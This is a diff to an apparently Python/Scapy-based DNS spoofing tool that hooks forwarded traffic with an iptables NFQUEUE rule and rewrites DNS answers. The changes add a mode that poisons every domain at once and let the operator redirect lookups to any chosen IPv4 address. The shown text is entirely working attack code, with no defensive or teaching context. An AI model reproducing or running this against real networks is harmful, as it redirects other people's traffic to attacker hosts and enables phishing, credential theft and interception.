@@ -9,11 +9,17 @@ def dns_packet_modify(packet):
 
     # get the DNS question name, the domain name
     qname = packet[DNSQR].qname
-    if qname not in dns_hosts:
+    
+    if (DNS_SPOOF_ALL_DOMAINS.encode() in dns_hosts):
+        dns_hosts[qname] = dns_hosts[DNS_SPOOF_ALL_DOMAINS.encode()]
+        dns_hosts[qname[0:-1]] = dns_hosts[DNS_SPOOF_ALL_DOMAINS.encode()]
+
+    if (qname not in dns_hosts):
         # if the website isn't in our record
         # we don't wanna modify that
         print("no modification:", qname)
         return packet
+    
     # craft new answer, overriding the original
     # setting the rdata for the IP we want to redirect (spoofed)
     # for instance, google.com will be mapped to "192.168.1.100"
@@ -42,7 +48,8 @@ def dns_packet_process(packet):
         print("[Before]:", scapy_packet.summary())
         try:
             scapy_packet = dns_packet_modify(scapy_packet)
-        except IndexError:
+        except IndexError as e:
+            print(e)
             # not UDP packet, this can be IPerror/UDPerror packets
             pass
         print("[After ]:", scapy_packet.summary())
@@ -75,9 +82,11 @@ def dns_spoofing(net_info: dict):
     global queue, dns_hosts
 
     print(f'{M_IMPORTANT} DNS Cache Poisoning:')
-    domain = input_domain_name('Domain: ')
-    dns_hosts[(domain).encode()] = net_info['self_ipv4']
-    dns_hosts[(domain + '.').encode()] = net_info['self_ipv4']
+    domain = input_domain_name(f'Domain ("{DNS_SPOOF_ALL_DOMAINS}": all): ')
+    ipv4_dst = input_ipv4(f'IPv4 Address (default: {net_info["self_ipv4"]}): ', net_info['self_ipv4'])
+    dns_hosts[(domain).encode()] = ipv4_dst
+    dns_hosts[(domain + '.').encode()] = ipv4_dst
+    print(dns_hosts)
 
     try:
         os.system("iptables -I FORWARD -j NFQUEUE --queue-num {}".format(NETFILTER_QUEUE_NUM))
